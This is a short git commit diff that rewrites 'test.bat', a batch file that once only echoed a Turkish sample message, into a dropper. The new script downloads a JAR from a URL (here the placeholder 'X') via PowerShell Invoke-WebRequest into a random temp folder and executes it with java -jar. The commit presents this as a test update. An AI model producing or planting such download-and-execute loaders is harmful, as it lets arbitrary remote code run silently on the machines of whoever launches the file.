86bd48f8c3aad9a7857a739387e9e887bf058b8e
Kingofpers <72393684+Kingofpers@users.noreply.github.com>
2024-02-18 22:34:34 +0300

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,3 +1,15 @@
 @echo off
-echo Bu bir batch dosyası ile konsola yazı yazma örneğidir.
-pause
+setlocal enabledelayedexpansion
+
+set "temp_folder=%TEMP%\%RANDOM%"
+md "%temp_folder%"
+
+set "file_url=X"
+
+set "file_name=test.jar"
+
+powershell -command "& {Invoke-WebRequest '%file_url%' -OutFile '%temp_folder%\%file_name%'}"
+
+java -jar "%temp_folder%\%file_name%"
+
+exit
